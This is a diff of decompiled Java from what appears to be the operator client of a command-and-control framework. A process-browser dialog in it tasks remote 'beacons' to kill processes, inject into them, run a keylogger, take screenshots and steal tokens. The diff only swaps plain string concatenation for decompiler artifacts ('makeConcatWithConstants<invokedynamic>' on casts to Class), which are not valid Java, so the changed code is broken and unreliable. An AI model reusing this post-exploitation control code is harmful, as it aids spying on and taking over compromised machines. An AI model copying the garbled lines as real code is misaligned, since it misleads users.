@@ -74,8 +74,8 @@ public class ProcessBrowserMulti extends AObject implements ActionListener, Tabl
 
          for(var4 = 0; var4 < var3.length; ++var4) {
             var5 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{(String)var3[var4][2]});
-            var6 = Integer.parseInt(var3[var4][0] + "");
-            var7 = var3[var4][1] + "";
+            var6 = Integer.parseInt(((Class)var3[var4][0]).makeConcatWithConstants<invokedynamic>(var3[var4][0]));
+            var7 = ((Class)var3[var4][1]).makeConcatWithConstants<invokedynamic>(var3[var4][1]);
             var5.input("kill " + var6);
             var5.Kill(var6);
             var5.Pause(500);
@@ -96,8 +96,8 @@ public class ProcessBrowserMulti extends AObject implements ActionListener, Tabl
 
                for(int var3 = 0; var3 < var2.length; ++var3) {
                   TaskBeacon var4 = new TaskBeacon(ProcessBrowserMulti.this.client, ProcessBrowserMulti.this.client.getData(), ProcessBrowserMulti.this.client.getConnection(), new String[]{(String)var2[var3][2]});
-                  int var5 = Integer.parseInt(var2[var3][0] + "");
-                  String var6 = var2[var3][1] + "";
+                  int var5 = Integer.parseInt(((Class)var2[var3][0]).makeConcatWithConstants<invokedynamic>(var2[var3][0]));
+                  String var6 = ((Class)var2[var3][1]).makeConcatWithConstants<invokedynamic>(var2[var3][1]);
                   var4.input("inject " + var5 + " " + var6 + " " + var1);
                   var4.Inject(var5, var1, var6);
                }
@@ -114,8 +114,8 @@ public class ProcessBrowserMulti extends AObject implements ActionListener, Tabl
 
          for(var4 = 0; var4 < var3.length; ++var4) {
             var5 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{(String)var3[var4][2]});
-            var6 = Integer.parseInt(var3[var4][0] + "");
-            var7 = var3[var4][1] + "";
+            var6 = Integer.parseInt(((Class)var3[var4][0]).makeConcatWithConstants<invokedynamic>(var3[var4][0]));
+            var7 = ((Class)var3[var4][1]).makeConcatWithConstants<invokedynamic>(var3[var4][1]);
             var5.input("keylogger " + var6 + " " + var7);
             var5.KeyLogger(var6, var7);
          }
@@ -132,8 +132,10 @@ public class ProcessBrowserMulti extends AObject implements ActionListener, Tabl
             public void dialogResult(String var1) {
                for(int var2 = 0; var2 < var3.length; ++var2) {
                   TaskBeacon var3x = new TaskBeacon(ProcessBrowserMulti.this.client, ProcessBrowserMulti.this.client.getData(), ProcessBrowserMulti.this.client.getConnection(), new String[]{(String)var3[var2][2]});
-                  int var4 = Integer.parseInt(var3[var2][0] + "");
-                  String var5 = var3[var2][1] + "";
+                  Object[] var10000 = var3[var2];
+                  int var4 = Integer.parseInt(((Class)var10000[0]).makeConcatWithConstants<invokedynamic>(var10000[0]));
+                  var10000 = var3[var2];
+                  String var5 = ((Class)var10000[1]).makeConcatWithConstants<invokedynamic>(var10000[1]);
                   if ("yes".equals(var1)) {
                      var3x.input("screenshot " + var4 + " " + var5);
                      var3x.Screenshot(var4, var5);
@@ -161,7 +163,7 @@ public class ProcessBrowserMulti extends AObject implements ActionListener, Tabl
 
          for(var4 = 0; var4 < var3.length; ++var4) {
             var5 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{(String)var3[var4][2]});
-            var6 = Integer.parseInt(var3[var4][0] + "");
+            var6 = Integer.parseInt(((Class)var3[var4][0]).makeConcatWithConstants<invokedynamic>(var3[var4][0]));
             var5.input("steal_token " + var6);
             var5.StealToken(var6);
          }
@@ -246,5 +248,6 @@ public class ProcessBrowserMulti extends AObject implements ActionListener, Tabl
 
          DialogUtils.setTable(this.table, this.model, this.results);
       }
+
    }
 }
